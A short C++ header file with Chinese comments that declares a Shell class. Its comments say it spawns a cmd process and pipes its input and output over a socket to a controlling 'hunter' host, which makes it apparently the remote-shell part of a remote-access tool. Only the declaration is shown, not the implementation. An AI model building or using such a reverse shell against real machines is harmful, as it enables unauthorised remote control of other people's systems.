// 创建cmd进程 通过管道连接其输入输出
// 并将管道连同至socket到hunter端
// 使得hunter端能够与cmd进程交互
// 使用单例模式

#pragma once
#include <strsafe.h>
#include "TcpSocket.h"

class Shell
{
public:
	~Shell();

	// 本类入口函数
	static void startShell(std::string domain, int port);
};

